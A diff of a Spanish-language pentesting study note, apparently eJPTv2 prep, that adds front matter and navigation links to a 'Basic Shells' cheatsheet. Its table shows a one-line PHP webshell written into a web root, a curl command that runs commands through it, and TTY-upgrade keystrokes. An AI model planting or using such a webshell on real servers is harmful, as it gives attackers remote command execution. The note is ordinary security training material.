@@ -1,5 +1,10 @@
+---
+tipo: cheatsheet
+tags: [shell, reverse-shell, bind-shell, webshell, netcat, mkfifo, tty]
+actualizado: 2026-05-28
+---
 
---------------------------------------------------------------------------
+# Basic Shells — Cheatsheet
 
 #shell #revshell 
 
@@ -17,3 +22,18 @@
 | `ctrl+z` luego luego luego dos veces`stty raw -echo``fg``enter`                    | Shell de actualización TTY (2)                                     |
 | `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                  | Crear un archivo php de webshell                                   |
 | `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                      | Ejecutar un comando en un webshell cargado                         |
+
+---
+
+## Navegación
+
+- ⬆️ Carpeta: [[index|5- shells]]
+- ➡️ Siguiente: [[2- tipos de shell]] — teoría completa de los 3 tipos.
+
+## Relacionadas
+
+- [[2- tipos de shell]] — explicación detallada de cada comando de este cheatsheet.
+- [[../4- privilege scalation/index|4- privilege scalation]] — siguiente paso tras obtener shell.
+- [[../6- Web/1- Protocolo HTTP|6- Web → HTTP]] — base del Web Shell (`curl`, parámetros GET).
+- [[4- Cómo Utilizar CURL con HTTP]] — uso de `curl` desde Linux/Bash.
+- [[../../../01-Sistemas-Operativos/Linux/1- El Hacker Legendario 🐧🐍 - Fundamentos, Hacking y Certificaciones/3- Preparación para la Certificación del eJPTv2/2- Curso de Python Aplicado a la Ciberseguridad/14- Sockets/1- Introducción a los Sockets|Sockets en Python]] — base de bind/reverse shells programáticas.
